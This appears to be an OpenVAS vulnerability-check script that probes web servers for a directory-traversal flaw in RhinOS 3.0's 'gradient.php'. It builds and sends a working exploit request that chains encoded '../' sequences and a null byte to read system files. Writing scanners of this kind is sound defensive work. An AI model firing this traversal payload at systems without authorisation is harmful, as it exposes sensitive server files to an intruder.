###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_RhinOS_46731.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# RhinOS 'gradient.php' Multiple Directory Traversal Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "RhinOS is prone to multiple directory-traversal vulnerabilities
because it fails to sufficiently sanitize user-supplied input.

Exploiting the issues can allow an attacker to obtain sensitive
information that could aid in further attacks.

RhinOS 3.0 r1113 is vulnerable; other versions may also be affected.";

if (description)
{
 script_id(103108);
 script_version("$Revision: 7577 $");
 script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
 script_tag(name:"creation_date", value:"2011-03-04 13:25:07 +0100 (Fri, 04 Mar 2011)");
 script_bugtraq_id(46731);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_name("RhinOS 'gradient.php' Multiple Directory Traversal Vulnerabilities");
 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/46731");
 script_xref(name : "URL" , value : "http://www.autosectools.com/Advisories/RhinOS.3.0.r1113_Local.File.Inclusion_133.html");
 script_xref(name : "URL" , value : "http://www.saltos.net/portal/en/rhinos.htm");
 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

files = traversal_files();

foreach dir( make_list_unique( "/rhinos", "/rhinos-es-3.0", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach file( keys( files ) ) {

    url = dir + "/admin/lib/gradient/gradient.php?tam=" + crap( data:"..%2f", length:10 * 9 ) + files[file] + "%00";

    if( http_vuln_check( port:port, url:url, pattern:file ) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
